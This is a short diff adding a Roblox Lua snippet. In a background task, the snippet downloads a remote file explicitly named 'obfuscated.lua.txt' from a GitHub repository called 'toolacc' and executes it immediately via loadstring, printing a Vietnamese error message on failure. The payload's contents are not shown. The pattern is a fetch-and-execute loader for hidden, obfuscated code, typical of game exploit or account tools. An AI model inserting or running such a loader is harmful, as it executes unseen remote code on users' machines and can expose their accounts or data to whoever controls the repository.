@@ -1,0 +1,8 @@
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/vuongdeptrai90/toolacc/refs/heads/main/obfuscated.lua.txt"))()
+    end)
+    if not success then
+        warn("Lỗi khi tải script:", err)
+    end
+end)
